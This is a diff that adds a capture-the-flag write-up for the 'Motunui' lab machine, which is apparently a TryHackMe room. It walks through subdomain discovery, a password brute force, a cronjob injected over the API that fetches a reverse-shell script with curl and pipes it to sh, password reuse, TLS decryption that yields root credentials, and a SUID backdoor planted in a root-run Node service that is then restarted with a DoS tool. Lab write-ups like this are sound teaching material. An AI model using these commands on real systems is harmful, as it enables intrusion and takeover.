@@ -1,12 +1,19 @@
 ---
 layout: default
 title: Motunui
-status: incomplete
 ---
 
 ## TL;DR
 
+In this challenge we find hidden subdomain `d3v3lopm3nt.motunui.thm` inside image `dashboard.png` that was extracted from `ticket_6746.pcapng` which was found inside SMB share.
 
+Then, we enumerate the `/docs` there, brute force the password of `maui` and create cronjob to get reverse shell.
+
+From there we can find the password of `moana` hidden inside `/etc/network.pkt`, being reused as we get hint to.
+
+Lastly, we move to root using password found on the same pcapng file, this time decrypted with `/etc/ssl.txt` we find.
+
+Another unexpected way to move to root, is to modify `/var/www/tls-html/server.js` which is being controlled by `www-data`, and then crash the service using `DoS`, which will make the service restart as root, and give us root command execution.
 
 ### Recon
 
@@ -146,7 +153,7 @@ The pages included on this virtual host are solely for developers Of Motunui. Pl
 
 And a new subdomain `d3v3lopm3nt.motunui.thm`, let's add it to our `/etc/hosts`.
 
-### ...
+### Brute force maui password and create cronjob for reverse shell
 
 Using `ffuf` I found an endpoint called `/docs`:
 ```bash
@@ -196,6 +203,8 @@ http://d3v3lopm3nt.motunui.thm/docs/ROUTES.md
 
 We can see there are two endpoints at `http://api.motunui.thm:3000/v2/`, `jobs` and `login`.
 
+First, we need to add `api.motunui.thm` to our `/etc/hosts`.
+
 I tried to login with some default credentials but it didn't work.
 
 ![login failed](image-7.png)
@@ -221,7 +230,179 @@ I logged in and got the hash `aXNsYW5k`.
 
 ![log in](image-10.png)
 
+Okay, now we can create cronjob, for example this cronjob:
+```bash
+* * * * * curl http://192.168.164.248:8081/rev_shell.sh|sh
+```
 
-### Privilege Escalation to Root
+The full payload will be:
+```json
+{
+    "hash":"aXNsYW5k",
+    "job":"* * * * * curl http://192.168.164.248:8081/rev_shell.sh|sh"
+}
+```
 
+![jobs](image-11.png)
 
+Inside `rev_shell.sh` we can put the penelope payload:
+
+![rev_shell.sh](image-12.png)
+
+and then, we got our reverse shell, as user `www-data`:
+
+![rev shell](image-13.png)
+
+### Find password for moana on /etc/network.pkt
+
+We can find the file `read_me` inside `moana`'s home folder:
+```bash
+www-data@motunui:/home/moana$ cat read_me 
+I know you've been on vacation and the last thing you want is me nagging you.
+
+But will you please consider not using the same password for all services? It puts us all at risk.
+
+I have started planning the new network design in packet tracer, and since you're 'the best engineer this island has seen', go find it and finish it.
+```
+Okay, there is some password reuse user `moana` is doing. In addition, there is same packer tracer, linpeas actually find the file `/etc/network.pkt` 
+
+![linpeas](image-14.png)
+
+So, let's install the software for analyzing this file from the official website of Cisco [https://www.netacad.com/resources/lab-downloads](https://www.netacad.com/resources/lab-downloads). You'll need to have an account, just create one.
+
+We can this schema:
+
+![schema](image-15.png)
+
+Okay, I clicked the switch, and went to the CLI tab.
+Then, we can type `enable` and `show run`, and find the password of moana.
+```bash
+username moana privilege 1 password 0 H0wF4ri'LLG0
+```
+
+![password](image-16.png)
+
+We can assume there is password reuse, let's try to ssh with the password we found:
+```bash
+ssh moana@motunui.thm # H0wF4ri'LLG0
+```
+
+![ssh moana](image-17.png)
+
+we can grab the user flag:
+```bash
+moana@motunui:~$ cat user.txt 
+THM{m0an4_0f_M0tunu1}
+```
+
+### Privilege Escalation to Root using TLS decryption and find root password
+
+The first way will be to find the file `/etc/ssl.txt` on the machine, let's download this file.
+
+Then, we'll load this session secrets to WireShark, with the same packet from before, I followed the instructions from here [https://wiki.wireshark.org/TLS](https://wiki.wireshark.org/TLS)
+
+> Edit -> Preferences -> Protocols -> TLS -> load ssl file
+
+![load ssl file](image-18.png)
+
+Now, we can see the decrypted messages.
+
+On one of the http streams, we can find the credentials:
+```bash
+username=root&password=Pl3aseW0rk
+```
+
+![find credentials](image-19.png)
+
+Now, we can move to user root and grab the root flag:
+
+![root flag](image-20.png)
+
+and the root flag:
+```bash
+root@motunui:/tmp# cat /root/root.txt 
+THM{h34rT_r35T0r3d}
+```
+
+### Privilege Escalation to Root using modify server.js and DoS the server
+
+When I checked for running services, we can see the service `https.service` is being executed by root, and execute the script `/var/www/tls-html/server.js`:
+```bash
+moana@motunui:/home$ systemctl cat https.service                                                                                                 
+# /etc/systemd/system/https.service                                                                                                              
+[Unit]                                                                                                                                           
+Description=The HTTPS website for Motunui                                                                                                        
+
+[Service]
+User=root
+Group=root
+ExecStart=/usr/bin/node /var/www/tls-html/server.js
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+```
+
+The interesting part is that the ones who controls `/var/www/tls-html/server.js` is `www-data`, which we already obtained.
+
+So, first let's check the file:
+```js
+const app = require('express')();
+const https = require('https');
+const fs = require('fs');
+
+app.get('/', (req, res) => {
+        res.send('welcome');
+});
+
+https.createServer({
+        key: fs.readFileSync('/var/www/tls-html/key.pem'),
+        cert: fs.readFileSync('/var/www/tls-html/cert.pem'),
+        passphrase: 'Password1'
+}, app).listen(5000);
+```
+
+Okay, it simply listens on port `5000`. I wants to add this lines into the file, now it should add `SUID` bit to `/bin/bash`:
+```js
+var exec = require('child_process').exec;
+
+exec('chmod u+s /bin/bash', () => {});
+```
+
+And we modify the file:
+
+![modify](image-21.png)
+
+Now, I want to make the service restart. The idea is to use [https://github.com/jseidl/GoldenEye](https://github.com/jseidl/GoldenEye), which will `DoS` the service until it crashes and restarts.
+
+We can check for the status of the service:
+```bash
+systemctl status https.service
+```
+
+![check status](image-22.png)
+
+Okay, let's execute the `DoS` attack, until the service crash, and then stop it:
+```bash
+python3 goldeneye.py http://localhost:5000/
+```
+
+![DoS](image-23.png)
+
+and we can check for the status again, we can see it restarted 11 seconds ago:
+
+![check status](image-24.png)
+
+When checking `/bin/bash`, we have the SUID bit:
+
+![SUID bit](image-25.png)
+
+Let's get root shell:
+```bash
+moana@motunui:~$ /bin/bash -p
+bash-4.4# id
+uid=1000(moana) gid=1000(moana) euid=0(root) groups=1000(moana)
+bash-4.4# cat /root/root.txt 
+THM{h34rT_r35T0r3d}
+```
